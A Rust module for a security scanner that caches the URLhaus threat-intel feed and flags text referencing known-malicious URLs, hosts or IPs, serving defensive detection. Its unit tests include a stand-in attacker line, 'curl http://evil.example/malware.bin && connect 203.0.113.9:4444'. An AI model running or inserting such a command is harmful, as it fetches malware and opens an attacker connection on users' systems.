//! Cached threat-intel matching. The feed is a plain line-per-entry list
//! (URLhaus `text_recent` format); matching is exact against either the full
//! URL or its hostname.

use crate::types::{Finding, Location, Severity};
use anyhow::{Context, Result};
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

const FEED_URL: &str = "https://urlhaus.abuse.ch/downloads/text_recent/";

#[derive(Debug, Default, Clone)]
pub struct IntelDb {
    entries: BTreeSet<String>,
}

impl IntelDb {
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    pub fn len(&self) -> usize {
        self.entries.len()
    }

    pub fn load_from(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("read intel feed {}", path.display()))?;
        let mut entries = BTreeSet::new();
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            insert_entry(&mut entries, line);
        }
        Ok(Self { entries })
    }

    /// Load the cached feed, if any.
    pub fn load() -> Self {
        cache_file()
            .and_then(|path| Self::load_from(&path).ok())
            .unwrap_or_default()
    }

    /// Refresh the cache from the network. With `offline`, just report the
    /// current cache size instead of fetching.
    pub fn update(offline: bool) -> Result<usize> {
        let path = cache_file().context("could not determine cache directory")?;
        if offline {
            return Ok(Self::load_from(&path).map(|db| db.len()).unwrap_or(0));
        }
        let client = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(20))
            .build()
            .context("build http client")?;
        let body = client
            .get(FEED_URL)
            .send()
            .context("fetch intel feed")?
            .error_for_status()
            .context("intel feed status")?
            .text()
            .context("read intel feed")?;
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&path, &body)?;
        Ok(body
            .lines()
            .filter(|line| {
                let line = line.trim();
                !line.is_empty() && !line.starts_with('#')
            })
            .count())
    }
}

pub fn cache_file() -> Option<PathBuf> {
    crate::config::cache_dir().map(|dir| dir.join("intel").join("urlhaus.txt"))
}

fn insert_entry(entries: &mut BTreeSet<String>, value: &str) {
    let lowered = value.to_ascii_lowercase();
    entries.insert(lowered.clone());
    if let Ok(url) = url::Url::parse(&lowered) {
        if let Some(host) = url.host_str() {
            entries.insert(host.to_string());
        }
    }
}

pub fn scan_text(path: &Path, text: &str, db: &IntelDb) -> Vec<Finding> {
    if db.is_empty() {
        return Vec::new();
    }
    let mut findings = Vec::new();
    let mut seen = BTreeSet::new();
    for token in text.split(|c: char| c.is_whitespace() || "()\"'<>,;".contains(c)) {
        let cleaned = token
            .trim_matches(|c: char| ".,;:!?[]{}".contains(c))
            .to_ascii_lowercase();
        if cleaned.len() < 8 {
            continue;
        }
        let host = url::Url::parse(&cleaned)
            .ok()
            .and_then(|url| url.host_str().map(|host| host.to_string()));
        let ip_host = cleaned.rsplit_once(':').and_then(|(host, _port)| {
            host.parse::<std::net::Ipv4Addr>()
                .is_ok()
                .then(|| host.to_string())
        });
        let hit = if db.entries.contains(&cleaned) {
            Some(cleaned.clone())
        } else {
            host.or(ip_host).filter(|host| db.entries.contains(host))
        };
        if let Some(hit) = hit {
            if seen.insert(hit.clone()) {
                findings.push(Finding {
                    id: format!("intel.url-match-{}", hit),
                    severity: Severity::High,
                    confidence: 0.75,
                    rule: "intel.url-match".to_string(),
                    category: "intel".to_string(),
                    location: Location {
                        path: path.to_string_lossy().to_string(),
                        line: None,
                        column: None,
                    },
                    message: format!("Reference matches a known-malicious feed entry: {}", hit),
                    snippet: Some(hit),
                    tags: vec!["intel".to_string()],
                });
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn loads_urls_and_hosts() {
        let dir = tempfile::tempdir().unwrap();
        let feed = dir.path().join("urlhaus.txt");
        std::fs::write(
            &feed,
            "# comment\nhttp://evil.example/malware.bin\n203.0.113.9\n",
        )
        .unwrap();
        let db = IntelDb::load_from(&feed).unwrap();
        assert!(db.entries.contains("http://evil.example/malware.bin"));
        assert!(db.entries.contains("evil.example"));
        assert!(db.entries.contains("203.0.113.9"));
    }

    #[test]
    fn matches_urls_hosts_and_ips() {
        let dir = tempfile::tempdir().unwrap();
        let feed = dir.path().join("urlhaus.txt");
        std::fs::write(&feed, "http://evil.example/malware.bin\n203.0.113.9\n").unwrap();
        let db = IntelDb::load_from(&feed).unwrap();

        let text = "curl http://evil.example/malware.bin && connect 203.0.113.9:4444";
        let findings = scan_text(&PathBuf::from("setup.sh"), text, &db);
        assert_eq!(findings.len(), 2);
        assert!(findings.iter().all(|f| f.rule == "intel.url-match"));
        assert!(findings.iter().all(|f| f.severity == Severity::High));
    }

    #[test]
    fn benign_text_is_quiet() {
        let dir = tempfile::tempdir().unwrap();
        let feed = dir.path().join("urlhaus.txt");
        std::fs::write(&feed, "http://evil.example/malware.bin\n").unwrap();
        let db = IntelDb::load_from(&feed).unwrap();
        assert!(scan_text(&PathBuf::from("a.js"), "const x = 1;", &db).is_empty());
    }
}
